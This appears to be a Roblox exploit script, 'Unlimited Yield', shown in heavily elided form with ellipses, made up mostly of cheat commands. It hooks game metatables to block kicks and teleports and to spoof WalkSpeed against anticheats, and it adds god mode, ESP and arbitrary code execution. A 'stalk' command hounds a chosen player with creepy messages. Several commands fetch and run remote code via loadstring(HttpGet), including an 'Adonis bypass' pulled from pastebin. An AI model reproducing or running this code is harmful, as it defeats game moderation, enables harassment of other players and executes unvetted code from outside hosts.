...
pcall(function() getgenv().UY_LOADED = true end)
...
if not game:IsLoaded() then
    ...
    notLoaded.Text = "Unlimited Yield is waiting for the game to load"
    game.Loaded:Wait()
    notLoaded:Destroy()
end
...
Title.TextSize = 18
Title.Text = "Unlimited Yield v" .. currentVersion
...
Logo.Image = "rbxassetid://77306782654770"
...
Credits.Text = "Edge // Zwolf // Moon // Toon // Vermin"
...
About.TextSize = 14
About.Text = "Plugins are .UY files and should be located in the 'workspace' folder of your exploit."
...
PluginsHint.Text = "Download plugins from the UY Discord (discord.gg/78ZuWSq)"
...
UYMouse = Players.LocalPlayer:GetMouse()
...
reference = (function()
	local main = create({
		...
		{114,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={112},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with UY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
...
function saves()
    if writefileExploit() and readfileExploit() and jsonAttempts < 10 then
        local readSuccess, out = readfile("UY_FE.UY", true)
        if readSuccess then
            if out ~= nil and tostring(out):gsub("%s", "") ~= "" then
                local success, response = pcall(function()
                    ...
                    if vtype(json.keepUY, "boolean") then KeepInfYield = json.keepUY else KeepInfYield = true end
                ...
                if not success then
                    ...
                    writefile("UY_FE.UY", defaults, true)
                    wait()
                    saves()
                end
            else
                writefile("UY_FE.UY", defaults, true)
                wait()
                local dReadSuccess, dOut = readfile("UY_FE.UY", true)
...
function updatesaves()
	if nosaves == false and writefileExploit() then
		...
		writefileCooldown("UY_FE.UY", HttpService:JSONEncode(update))
	end
end
...
UYMouse.KeyDown:Connect(function(Key)
	if (Key==prefix) then
...
SaveChatlogs.MouseButton1Down:Connect(function()
	if writefileExploit() then
		if #scroll_2:GetChildren() > 0 then
			...
			local writelogs = '-- Unlimited Yield Chat logs for "'..placeName..'"\n'
			for _, child in pairs(scroll_2:GetChildren()) do
				writelogs = writelogs..'\n'..child.Text
			end
...
function selectPart()
	...
	local function HighlightPart()
		if selected.Adornee ~= UYMouse.Target then
			selectionBox.Adornee = UYMouse.Target
		else
			selectionBox.Adornee = nil
		end
	end
	ActivateHighlight = UYMouse.Move:Connect(HighlightPart)
	local function SelectPart()
		if UYMouse.Target ~= nil then
			selected.Adornee = UYMouse.Target
			Path.Text = getHierarchy(UYMouse.Target)
		end
	end
	ClickSelect = UYMouse.Button1Down:Connect(SelectPart)
end
...
CMDs[#CMDs + 1] = {NAME = 'hideUY', DESC = 'Hides the main UY GUI'}
CMDs[#CMDs + 1] = {NAME = 'showUY / unhideUY', DESC = 'Shows UY again'}
CMDs[#CMDs + 1] = {NAME = 'keepUY', DESC = 'Auto execute UY when you teleport through servers'}
CMDs[#CMDs + 1] = {NAME = 'unkeepUY', DESC = 'Disable keepUY'}
CMDs[#CMDs + 1] = {NAME = 'togglekeepUY', DESC = 'Toggle keepUY'}
...
CMDs[#CMDs + 1] = {NAME = 'unclientantiteleport / unantiteleport (CLIENT)', DESC = 'Disables Anti-Teleport'}
...
CMDs[#CMDs + 1] = {NAME = 'god2', DESC = '[BETA] Reworked version of the original god method'}
...
function checkTT()
	local t
	local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(UYMouse.X, UYMouse.Y)
	...
	if t ~= nil and t:GetAttribute("Title") ~= nil then
		...
		local xP
		local yP
		if UYMouse.X > 200 then
			xP = x - 201
		else
			xP = x + 21
		end
		if UYMouse.Y > (UYMouse.ViewSizeY-96) then
			yP = y - 97
		else
			yP = y
		end
			...
			if cmd then
				...
				if infTimes then
					while lastBreakTime < cmdStartTime do
						...
						if not success and _G.UY_DEBUG then
...
local MousePositionToVector2 = function()
	return Vector2.new(UYMouse.X, UYMouse.Y)
end
	...
	task.spawn(function()
		...
		if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
			...
			if plr.Character and plr.Character:FindFirstChild('Head') then
				...
				HealthBarBG.Position = UDim2.new(0.1, 0, 0.3, 0)
				...
				ToolLabel.Position = UDim2.new(0, 0, 0.75, 0)
				...
				local function espLoop()
					if COREGUI:FindFirstChild(plr.Name..'_ESP') then
						if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
							...
							local playerRootPart = getRoot(Players.LocalPlayer.Character)
							
							-- Calculate distance
							local distance = math.floor((playerRootPart.Position - rootPart.Position).magnitude)
							...
							elseif healthPercent > 0.25 then
								HealthBar.BackgroundColor3 = Color3.new(1, 0.5, 0) -- Orange
							else
							...
							local scale = math.clamp(1 - (distance/150), 0.5, 1)
							BillboardGui.Size = UDim2.new(0, 200 * scale, 0, 100 * scale)
							
							-- Adjust transparency based on distance
							local textTransparency = math.clamp((distance - 50) / 100, 0, 0.5)
							NameLabel.TextTransparency = textTransparency
							HealthText.TextTransparency = textTransparency
							DistanceLabel.TextTransparency = textTransparency
							ToolLabel.TextTransparency = textTransparency
						end
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
...
local function clicktpFunc()
	pcall(function()
		...
		local hitPosition = UYMouse.Hit.Position
...
UYMouse.Button1Down:Connect(function()
	for i,v in pairs(binds) do
		...
		elseif v.COMMAND == 'clickdel' then
			...
			if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
				pcall(function() UYMouse.Target:Destroy() end)
...
function addPlugin(name)
	if name:lower() == 'plugin file name' or name:lower() == 'UY_fe.UY' or name == 'UY_fe' then
		notify('Plugin Error','Please enter a valid plugin')
	else
		local file
		local fileName
		if name:sub(-3) == '.UY' then
			pcall(function() file = readfile(name) end)
			fileName = name
		else
			pcall(function() file = readfile(name..'.UY') end)
			fileName = name..'.UY'
		end
		if file then
...
Players.LocalPlayer.OnTeleport:Connect(function(State)
	if KeepInfYield and (not TeleportCheck) and queueteleport then
		TeleportCheck = true
		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeUY/infiniteyield/master/source'))()")
	end
end)
...
addcmd('keepUY', {}, function(args, speaker)
...
addcmd('unkeepUY', {}, function(args, speaker)
	if queueteleport then
		KeepInfYield = false
		updatesaves()
	else
...
addcmd('togglekeepUY', {}, function(args, speaker)
	if queueteleport then
...
function sFLY(vfly)
	...
	flyKeyDown = UYMouse.KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (vfly and vehicleflyspeed or UYflyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (vfly and vehicleflyspeed or UYflyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (vfly and vehicleflyspeed or UYflyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (vfly and vehicleflyspeed or UYflyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (vfly and vehicleflyspeed or UYflyspeed)*2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(vfly and vehicleflyspeed or UYflyspeed)*2
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
	end)
	flyKeyUp = UYMouse.KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
	...
	mfly2 = RunService.RenderStepped:Connect(function()
		...
		if speaker.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
			...
			if direction.X > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or UYflyspeed) * 50))
			end
			if direction.X < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or UYflyspeed) * 50))
			end
			if direction.Z > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or UYflyspeed) * 50))
			end
			if direction.Z < 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or UYflyspeed) * 50))
			end
...
addcmd('float', {'platform'},function(args, speaker)
	...
	if pchar and not pchar:FindFirstChild(floatName) then
		task.spawn(function()
			...
			qUp = UYMouse.KeyUp:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue + 0.5
				end
			end)
			eUp = UYMouse.KeyUp:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue - 1.5
				end
			end)
			qDown = UYMouse.KeyDown:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue - 0.5
				end
			end)
			eDown = UYMouse.KeyDown:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue + 1.5
				end
			end)
...
function deleteGuisAtPos()
	pcall(function()
		local guisAtPosition = Players.LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(UYMouse.X, UYMouse.Y)
		for _, gui in pairs(guisAtPosition) do
...
addcmd('hideUY',{},function(args, speaker)
	isHidden = true
	...
	minimizeNum = 0
	minimizeHolder()
	if not (args[1] and tostring(args[1]) == 'nonotify') then notify('UY Hidden','You can press the prefix key to access the command bar') end
end)

addcmd('showUY',{'unhideUY'},function(args, speaker)
	isHidden = false
	minimizeNum = -20
	if wasStayOpen then
		maximizeHolder()
...
addcmd('clientantikick',{'antikick'},function(args, speaker)
	...
	-- More robust __index hook
	oldhmmi = hookmetamethod(game, "__index", function(self, method)
		if antikickEnabled and self == LocalPlayer and (method:lower() == "kick" or method:lower() == "remove") then
			warn("[UY] Blocked kick attempt via __index")
			return function() return nil end
		end
		return oldhmmi(self, method)
	end)
	
	-- More robust __namecall hook
	oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
		local method = getnamecallmethod():lower()
		if antikickEnabled and self == LocalPlayer and (method == "kick" or method == "remove") then
			warn("[UY] Blocked kick attempt via __namecall")
			return nil
		end
	...
	-- Add cleanup command
	addcmd('unclientantikick',{'unantikick'},function(args, speaker)
		...
		notify('Client Antikick','Client anti kick has been disabled')
	end)
	
	-- Add to connections table for proper cleanup
	table.insert(Connections, {Name = "AntiKick", Enabled = true})
end)
...
addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
	...
	-- More robust __index hook
	oldhmmi = hookmetamethod(game, "__index", function(self, method)
		if antitpEnabled and self == TeleportService then
			local methodLower = method:lower()
			if methodLower == "teleport" or method == "TeleportToPlaceInstance" or 
			   methodLower == "teleporttoplaceasync" or methodLower == "teleporttoplaceasync" then
				warn("[UY] Blocked teleport attempt via __index: " .. method)
				return function(...) 
					if allow_rj and methodLower == "teleport" and select(1, ...) == game.PlaceId then
						return oldhmmi(self, method)(...)
					end
					return nil 
				end
	...
	oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
		...
		if antitpEnabled and self == TeleportService then
			local methodLower = method:lower()
			if methodLower == "teleport" or method == "TeleportToPlaceInstance" or 
			   methodLower == "teleporttoplaceasync" or methodLower == "teleportpartyasync" then
				warn("[UY] Blocked teleport attempt via __namecall: " .. method)
				-- Allow rejoin if enabled
				if allow_rj and methodLower == "teleport" and args[1] == game.PlaceId then
					return oldhmmnc(self, ...)
				end
				return nil
			end
	...
	-- Add cleanup command
	addcmd('unclientantiteleport',{'unantiteleport'},function(args, speaker)
        notify('Client AntiTP','Client anti teleport has been disabled')
		antitpEnabled = false
		for _, connection in pairs(antitpConnections) do
			if typeof(connection) == "RBXScriptConnection" then
				connection:Disconnect()
			end
		end
	...
	-- Add to connections table for proper cleanup
	table.insert(Connections, {Name = "AntiTeleport", Enabled = true})
end)
...
addcmd('antiafk',{'antiidle'},function(args, speaker)
	notify('Anti Idle Loaded','Anti idle has been loaded. Preventing idle kicks and ram overflow')
...
addcmd('god2',{},function(args, speaker)
	local character = speaker.Character or speaker.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	
	-- Disable all client scripts to prevent damage handlers
	...
	-- Create a connection to constantly set health to max
	local godConnection
	godConnection = RunService.Heartbeat:Connect(function()
		...
		-- Additional FE godmode measures
		pcall(function()
			-- Prevent ragdoll
			humanoid.BreakJointsOnDeath = false
			
			-- Prevent damage from touching harmful parts
			...
			-- Disable character collision with other characters
			for _, part in pairs(character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CollisionGroup = "GodModeGroup"
				end
			end
		end)
	end)
	
	-- Watch for new instances to disable scripts
	local newInstanceConnection
	newInstanceConnection = character.DescendantAdded:Connect(function(desc)
	...
	deathConnection = humanoid.Died:Connect(function()
		...
		if newInstanceConnection then
			newInstanceConnection:Disconnect()
		end
	...
	-- Create collision group for god mode
	pcall(function()
		PhysicsService:CreateCollisionGroup("GodModeGroup")
		PhysicsService:CollisionGroupSetCollidable("GodModeGroup", "Default", false)
	end)
	
	notify('God Mode 2', 'Enhanced universal god mode enabled')
end)
...
addcmd('tptool', {'teleporttool'}, function(args, speaker)
	...
	TpTool.Activated:Connect(function()
		...
		HRP.CFrame = CFrame.new(UYMouse.Hit.X, UYMouse.Hit.Y + 3, UYMouse.Hit.Z, select(4, HRP.CFrame:components()))
	end)
end)
...
addcmd('stalk',{},function(args, speaker)
	notify("Stalking!",'Rejoin to disable')
...
local FLEE_DISTANCE = 25
local MESSAGE_INTERVAL = 30
local TELEPORT_COOLDOWN = 2 -- 2 seconds cooldown to prevent spamming teleports
...
local stalkingEnabled = false -- Flag to track if stalking is active

-- Function to unload the script if it's executed again
local function unloadScript()
    -- Check if other instances of this script are running
    for _, scriptInstance in pairs(ReplicatedStorage:GetChildren()) do
        if scriptInstance.Name == script.Name and scriptInstance ~= script then
...
-- Ensure the script is unloaded when the player resets their character
...
local function isLookingAway(targetHRP, yourPos)
    local targetLook = targetHRP.CFrame.LookVector
    local toYou = (yourPos - targetHRP.Position).Unit
    local dot = targetLook:Dot(toYou)
    return dot < -0.5
end

local function isSafeSpot(pos)
    local region = Region3.new(
        pos - Vector3.new(2, 3, 2),
        pos + Vector3.new(2, 3, 2)
    )
...
local function isSafeGround(pos)
    ...
    return result
        ...
        and result.Instance.Material ~= Enum.Material.Water
end

local function findCreepySpot(targetHRP, flee)
    local attempts = 30
    local rayParams = RaycastParams.new()
    rayParams.IgnoreWater = true
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = { character, targetHRP.Parent }

    for i = 1, attempts do
        local angle = math.random() * 2 * math.pi
        local dist = math.random(
            flee and MAX_DISTANCE or MIN_DISTANCE,
            MAX_DISTANCE
        )
        local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * dist
        local position = targetHRP.Position + offset + Vector3.new(0, 3, 0)

        -- Ensure the spot is safe and above the ground
        if
            isLookingAway(targetHRP, position)
            and isSafeSpot(position)
            and isSafeGround(position)
        then
            return position
        end
    end
...
local function teleportTo(pos, targetHRP)
    -- Remove any unwanted welds
    ...
    -- Ensure we don't teleport underground or into walls
    local newPos = pos + Vector3.new(0, 3, 0) -- Ensure we're above the ground
    character:SetPrimaryPartCFrame(CFrame.new(newPos, targetHRP.Position))
end

local function sendCreepyMessage()
    local message = spookyMessages[math.random(1, #spookyMessages)]
...
-- Main loop for stalking behavior
local function stalk()
    RunService.Heartbeat:Connect(function()
        ...
        -- Creepy message every MESSAGE_INTERVAL seconds
        if t - LAST_MSG >= MESSAGE_INTERVAL then
            LAST_MSG = t
            
        end

        -- Face the target at all times
        local lookCFrame = CFrame.new(rootPart.Position, targetHRP.Position)
        character:SetPrimaryPartCFrame(lookCFrame)

        -- Only teleport if the target is moving or if they're too close
        local currentPos = targetHRP.Position
        if not LAST_TARGET_POS then
            LAST_TARGET_POS = currentPos
            return
        end

        local movedDist = (currentPos - LAST_TARGET_POS).Magnitude
        local distToTarget = (rootPart.Position - currentPos).Magnitude
        local flee = distToTarget < FLEE_DISTANCE

        -- If the target is moving or getting closer/away, find a new spot
        if movedDist > 1 or flee then
            -- Only teleport when looking away and once every 2 seconds
            if
                isLookingAway(targetHRP, rootPart.Position)
                and (t - LAST_TP >= TELEPORT_COOLDOWN)
            then
                local newPos = findCreepySpot(targetHRP, flee)
                if newPos then
                    teleportTo(newPos, targetHRP)
                    LAST_TP = t -- Update the last teleport time
                end
            end
            LAST_TARGET_POS = currentPos
        end
...
-- Toggle function to start/stop stalking
local function toggleStalking()
    if stalkingEnabled then
        -- If already stalking, stop it by unloading the script
        unloadScript()
        stalkingEnabled = false
    else
...
addcmd('adonisbypass',{'adb'},function(args, speaker)
	notify("Bypassed!",'Adonis Bypass Loaded')
	loadstring(game:HttpGet("https://pastebin.com/raw/09UVzWme"))()
end)

addcmd('exec',{},function(args, speaker)
	-- Check if there are any arguments
	if not args[1] then
		notify("Exec Error", "No script provided")
		return
	end
	...
	local success, errorMsg = pcall(function()
		-- Use loadstring to execute the Lua code
		local func, syntaxError = loadstring(script)
		
		if not func then
			-- If there's a syntax error, notify the user
			notify("Syntax Error", syntaxError or "Unknown syntax error")
			return
		end
	...
	-- If execution failed, notify the user
	if not success then
		notify("Execution Error", errorMsg or "Unknown execution error")
	else
...
addcmd('antiwalkspeeddetector',{'antiws','awsd'},function(args, speaker)
	notify("Anti WalkSpeed Detector", "Enabled")
	
	local character = speaker.Character or speaker.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	
	-- Store the original walkspeed for restoration
	local realWalkSpeed = humanoid.WalkSpeed
	local fakeWalkSpeed = 16 -- Default walkspeed that server/anticheats will see
	
	-- Create a more robust spoofing system
	local spoofedProperties = {}
	
	-- Hook into the game's metatable with advanced protection
	local mt = getrawmetatable(game)
	local oldIndex = mt.__index
	local oldNewIndex = mt.__newindex
	setreadonly(mt, false)
	
	-- Create a secure environment for our hooks
	local function secureHook(func)
		return newcclosure(function(...)
			local success, result = pcall(func, ...)
			if success then return result end
	...
	-- More aggressive index hook to prevent detection
	mt.__index = secureHook(function(self, key)
		-- Only intercept Humanoid.WalkSpeed
		if self:IsA("Humanoid") and key == "WalkSpeed" then
			-- If it's an anticheat or server check
			if not checkcaller() then
	...
	-- More aggressive newindex hook to prevent detection
	mt.__newindex = secureHook(function(self, key, value)
		if self:IsA("Humanoid") and key == "WalkSpeed" then
			-- If our script is changing walkspeed
			if checkcaller() then
				realWalkSpeed = value
				
				-- Apply the real walkspeed using a different method
				task.spawn(function()
					pcall(function()
						-- Use a raw property setter to bypass detection
						for _, v in pairs(getconnections(self:GetPropertyChangedSignal("WalkSpeed"))) do
							v:Disable()
						end
						...
						-- Re-enable connections after a tiny delay
						task.delay(0.1, function()
							for _, v in pairs(getconnections(self:GetPropertyChangedSignal("WalkSpeed"))) do
								v:Enable()
							end
				...
				-- If server/anticheat is changing walkspeed
				fakeWalkSpeed = value
				
				-- Let the server think it changed the value
				-- but don't actually change our real value
				return
			end
		end
	...
	-- Multiple methods to apply our real walkspeed without detection
	local function applyRealWalkSpeed()
		if not humanoid or not humanoid.Parent then return end
		
		pcall(function()
			-- Method 1: Direct property access with connection disabling
			...
			-- Method 2: Use the Humanoid internal functions if possible
			pcall(function()
				local oldWalkFunc = humanoid.Move
				if oldWalkFunc then
					humanoid.Move = function(...)
						local args = {...}
						-- Modify movement speed in the internal function
						return oldWalkFunc(...)
					end
				end
			end)
	...
	-- Create a more frequent update loop
	local renderStepConnection = game:GetService("RunService").RenderStepped:Connect(function()
		if humanoid and humanoid.Parent then
			applyRealWalkSpeed()
		else
			-- Character might have respawned, get the new humanoid
			character = speaker.Character
			if character then
				humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					realWalkSpeed = humanoid.WalkSpeed
				end
			end
		end
	end)
	
	-- Also hook the heartbeat for redundancy
	local heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
		if humanoid and humanoid.Parent then
			applyRealWalkSpeed()
		end
	...
	-- Handle character respawns with improved detection
	local characterAddedConnection = speaker.CharacterAdded:Connect(function(newCharacter)
		character = newCharacter
		...
		if success and humanoid then
			-- Reset our values for the new humanoid
			realWalkSpeed = humanoid.WalkSpeed
			fakeWalkSpeed = 16
			
			-- Apply our hooks to the new humanoid
			applyRealWalkSpeed()
		end
	end)
	...
	local function disableAntiWalkspeedDetector()
		if renderStepConnection then renderStepConnection:Disconnect() end
		if heartbeatConnection then heartbeatConnection:Disconnect() end
		if characterAddedConnection then characterAddedConnection:Disconnect() end
		
		-- Restore original metatables if possible
		pcall(function()
			local mt = getrawmetatable(game)
			setreadonly(mt, false)
			mt.__index = oldIndex
		...
		notify("Anti WalkSpeed Detector", "Disabled")
	end
	
	-- Add disable command
	addcmd('unantiwalkspeeddetector',{'unantiws','unawsd'},function(args, speaker)
		disableAntiWalkspeedDetector()
	end)
end)



addcmd('unload',{'killuy'},function(args, speaker)
	if PARENT and PARENT:IsA("ScreenGui") then
		PARENT:Destroy()
	end
	if PluginsTable then
		for i,v in pairs(PluginsTable) do
			if type(v) == "table" and v.PLUGIN then
				v.PLUGIN:Destroy()
			end
		end
	end
	...
	eventEditor.ClearAllEvents()
	for i,v in pairs(getgenv()) do
		if UYMouse and v == UYMouse then
			getgenv()[i] = nil
		end
	end
	if writefileExploit() then
		if pcall(function() readfile("UY_FE.UY") end) then
			delfile("UY_FE.UY")
		end
	end
	-- Remove UY_LOADED check to allow reloading
	getgenv().UY_LOADED = false
	
	-- Clear key variables but preserve core functions
	PARENT = nil
	PluginsTable = {}
	Connections = {}
	UYMouse = nil
...
addcmd('findplaces',{},function(args, speaker)
	if speaker:GetAttribute("PlaceFinder_NS") then
		notify("Place Finder", "You already executed this!")
		return
	end
...
local messages = {
	...
	"one robux = one prayer for my avatar's happiness",
	"donate and I will do a little dance that nobody can see but I promise it's happening",
	"my mom said if I get 10 robux she will let me eat dinner tonight",
	"I've been standing here so long my legs turned into pixels",
	"help a noob out please I just want cool stuff like everyone else",
	"I'm not poor I'm just robux challenged",
	"donate and become my best friend forever and ever no take backs",
	"I will remember your username if you donate and think about how cool you are",
	"my avatar is sad because it has no robux, look at its face",
	"I've been clicking the same button for days trying to earn robux help me",
	"donate or I will keep doing this weird dance until the server closes",
	...
	"donate and I will tell you a secret about this game that I just made up",
	"help me I'm stuck in an endless loop of asking for robux oh no",
	"I've been wearing the same free shirt for years straight",
	"donate and I will stop following you around the map probably",
	"I tried to get robux by doing my chores but my mom said no",
	"I'm not begging I'm just asking repeatedly with increasing hope",
	"donate and I will friend you and then immediately forget who you are",
	...
	"I told my little brother I would get him robux but I need help",
	"donate and I will name my next roblox character after you maybe",
	...
	"donate or I will keep typing these messages until my keyboard breaks",
	"my roblox character hasn't eaten in days he's surviving on free items",
	"donate and I will tell everyone you're the coolest person in the server",
	"I've been playing so long my avatar is getting old and needs robux medicine",
	"pls donate I need robux for my imaginary roblox party tomorrow",
	"I will give you a virtual high five if you donate (you won't feel it but it's real)",
	"donate and I will stop crying on the inside and start crying on the outside",
	"my robux wallet is so empty even dust moved out",
	"I've been saving up for years and still can't afford the cool legs",
	"donate if you think bacon hairs deserve rights too",
	"I will remember your kindness until the next server hop",
	"donate and I will do my homework probably maybe not really",
	...
	"donate and I will stop talking for at least 5 seconds",
	"I need robux to feed my adopt me pets they're hungry",
	"my only friend is the donate button and it doesn't even like me back",
	"donate and I will tell you the secret to getting free robux (there isn't one)",
	"I've been here so long the server thinks I'm part of the map",
	"pls donate my roblox friend will leave me if I don't get robux",
	"I'm not poor I just enjoy standing at donation stands for fun",
	"donate and I will give you a shoutout to my zero followers",
	"help me afford a face so I can finally express emotions",
	"I've been refreshing my robux balance for days nothing's changed",
	"donate and I will stop using these messages (no I won't)",
	...
	"donate and I will tell my mom you're cool she won't care but I will tell her",
	"I'm saving up for a robux item that will definitely be gone tomorrow",
	"help me I've been wearing the same free face since forever",
	"donate and I will draw your avatar with my eyes closed"
}
...
addcmd('untweenfly',{'notweenfly'},function(args, speaker)
	-- Disconnect all connections
	if _G.tweenFlyLoop then
...
addcmd('toggletweenfly',{},function(args, speaker)
	if _G.tweenFlyLoop then
		execCmd('untweenfly')
	else
...
addcmd('hovername',{},function(args, speaker)
	...
	nbUpdateFunc = UYMouse.Move:Connect(updateNameBox)
end)
...
addcmd("addallplugins", {"loadallplugins"}, function(args, speaker)
    ...
    for _, filePath in ipairs(listfiles("")) do
        local fileName = filePath:match("([^/\\]+%.UY)$")

        if fileName and
            fileName:lower() ~= "UY_fe.UY" and
...
task.spawn(function()
	local success, latestVersionInfo = pcall(function() 
		local versionJson = game:HttpGet('https://raw.githubusercontent.com/EdgeUY/infiniteyield/master/version')
...
task.spawn(function()
	...
	minimizeHolder()
	if IsOnMobile then notify("Unstable Device", "On mobile, Unlimited Yield may have issues or features that are not functioning correctly.") end
end)
...
if os.date("%m %d") == "04 01" then
	...
	Title.Text = string.gsub(Title.Text, "Unlimited Yield FE", "fortnite hack")
end
